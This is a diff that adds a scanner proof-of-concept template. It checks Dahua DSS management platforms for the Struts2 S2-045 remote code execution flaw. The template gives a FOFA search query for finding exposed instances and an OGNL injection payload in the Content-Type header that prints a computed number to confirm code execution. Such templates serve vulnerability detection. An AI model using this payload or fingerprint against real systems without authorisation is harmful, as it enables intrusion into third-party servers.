@@ -1,0 +1,23 @@
+id: poc-yaml-dahua-dss-integrated-management-platform-login-init-action-st2-045-rce
+info:
+  name: 大华DSS综合管理平台 login_init.action ST2-045 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 大华DSS综合管理平台
+  fofa: body="/portal/include/script/dahuaDefined/headCommon.js?type=index" && title="DSS"
+variables:
+  t1: random_int(1000,10000)
+  t2: random_int(1000,10000)
+  Path: 'admin/login_login.action
+
+    portal/login_init.action
+
+    '
+requests:
+- method: POST
+  path: /{{.Path}}
+  headers:
+    Content-Type: '%{(#n=''multipart/form-data'').(#d=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#d):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println({{.t1}}*{{.t2}})).(#o.close())}'
+  expression: status_code == 200 && contains(body,t1*t2)
+transport: http
